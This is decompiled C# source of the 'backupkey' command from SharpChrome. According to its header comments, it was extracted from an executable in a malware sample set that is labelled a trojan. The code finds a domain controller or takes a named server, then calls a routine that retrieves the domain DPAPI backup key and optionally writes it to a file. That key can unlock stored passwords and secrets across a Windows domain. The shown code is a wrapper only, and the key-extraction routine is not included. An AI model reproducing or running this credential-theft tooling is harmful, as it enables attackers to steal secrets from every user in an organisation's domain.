// Decompiled with JetBrains decompiler
// Type: SharpChrome.Commands.Backupkey
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using SharpDPAPI;
using System;
using System.Collections.Generic;

namespace SharpChrome.Commands
{
  public class Backupkey : ICommand
  {
    public static string CommandName => "backupkey";

    public void Execute(Dictionary<string, string> arguments)
    {
      Console.WriteLine("\r\n[*] Action: Retrieve domain DPAPI backup key\r\n");
      string outFile = "";
      string dcName;
      if (arguments.ContainsKey("/server"))
      {
        dcName = arguments["/server"];
        Console.WriteLine("\r\n[*] Using server                     : {0}", (object) dcName);
      }
      else
      {
        dcName = Interop.GetDCName();
        if (string.IsNullOrEmpty(dcName))
          return;
        Console.WriteLine("\r\n[*] Using current domain controller  : {0}", (object) dcName);
      }
      if (arguments.ContainsKey("/file"))
        outFile = arguments["/file"];
      Backup.GetBackupKey(dcName, outFile);
    }
  }
}
